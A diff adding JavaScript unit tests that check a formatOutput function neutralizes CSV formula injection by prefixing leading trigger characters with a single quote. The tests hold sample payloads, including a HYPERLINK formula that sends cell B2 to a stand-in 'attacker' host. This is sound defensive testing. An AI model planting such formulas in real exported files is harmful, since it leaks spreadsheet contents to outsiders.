@@ -154,6 +154,42 @@ describe('formatOutput', () => {
       expect(result).toContain('166500');
       expect(result).not.toContain('1665.00');
     });
+
+    describe('formula-injection neutralization', () => {
+      it.each([
+        ['=1+1'],
+        ['+1+1'],
+        ['-2+3'],
+        ['@SUM(1+1)'],
+        ['\tHELLO'],
+        ['\rHELLO'],
+      ])('prefixes a leading %j with a single quote', payload => {
+        const data = [{ val: payload }];
+        const result = formatOutput(data, 'csv');
+        expect(result).toBe(`val\n'${payload}`);
+      });
+
+      it('neutralizes formula triggers even when the value also needs quoting', () => {
+        const data = [{ val: '=HYPERLINK("http://attacker/?d="&B2,"x")' }];
+        const result = formatOutput(data, 'csv');
+        const lines = result.split('\n');
+        expect(lines[1]).toBe(
+          '"\'=HYPERLINK(""http://attacker/?d=""&B2,""x"")"',
+        );
+      });
+
+      it('does not neutralize trigger characters that appear mid-string', () => {
+        const data = [{ val: 'a+b' }];
+        const result = formatOutput(data, 'csv');
+        expect(result).toBe('val\na+b');
+      });
+
+      it('does not prefix negative amount values', () => {
+        const data = [{ amount: -2500 }];
+        const result = formatOutput(data, 'csv');
+        expect(result).toBe('amount\n-25.00');
+      });
+    });
   });
 });
 
